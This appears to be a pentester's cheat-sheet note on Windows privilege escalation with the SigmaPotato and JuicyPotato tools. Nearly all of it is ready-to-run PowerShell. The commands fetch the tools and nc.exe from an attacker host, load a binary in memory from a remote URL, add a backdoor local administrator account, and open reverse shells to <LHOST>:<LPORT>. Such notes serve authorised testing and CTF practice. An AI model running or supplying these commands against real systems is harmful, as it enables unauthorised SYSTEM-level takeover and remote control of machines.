---
title: Potato Family
type: note
tab: Privesc
tools: [SigmaPotato, JuicyPotato]
inputs: [Shell]
outputs: [SYSTEM, Admin]
tags: [Windows, PrivilegeEscalation]
---

# Potato Family

## When

- You already have code execution on a Windows host.
- `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.
- Common contexts: IIS app pool, `LocalService`, `NetworkService`, or another service account.

## SigmaPotato

#Shell #Windows #PrivilegeEscalation
Check privileges, download SigmaPotato, and use it for admin or shell access.

```powershell
# Confirm impersonation-related privileges first.
whoami /priv

# Download SigmaPotato to disk.
iwr -Uri http://<LHOST>/SigmaPotato.exe -OutFile SigmaPotato.exe
certutil.exe -urlcache -f http://<LHOST>/SigmaPotato.exe SigmaPotato.exe

# Add a local admin user.
.\SigmaPotato.exe "net user <USER> <PASS> /add"
.\SigmaPotato.exe "net localgroup Administrators <USER> /add"

# Or run a single command / reverse shell instead.
.\SigmaPotato.exe "<COMMAND>"
.\SigmaPotato.exe --revshell <LHOST> <LPORT>

# Memory-only option.
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://<LHOST>/SigmaPotato.exe"))
[SigmaPotato]::Main("<COMMAND>")
[SigmaPotato]::Main(@("--revshell","<LHOST>","<LPORT>"))
```

## JuicyPotato

#Shell #Windows #PrivilegeEscalation
Download JuicyPotato and use it to spawn a SYSTEM shell.

```powershell
# Quick test with the default CLSID.
.\JuicyPotato.exe -t * -p C:\temp\shell.exe -l 443

# Download JuicyPotato and nc.exe.
certutil.exe -urlcache -f http://<LHOST>/JuicyPotato.exe JuicyPotato.exe
certutil.exe -urlcache -f http://<LHOST>/nc.exe nc.exe

# Spawn a SYSTEM shell or reverse shell.
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\nc.exe -e cmd.exe <LHOST> <LPORT>" -t *
```

## Notes

- SigmaPotato is usually the first thing to try on newer Windows builds.
- JuicyPotato is mainly useful on older Windows / Server versions.
- If the target blocks `nc.exe`, use a staged PowerShell command instead of `cmd.exe /c ...`.
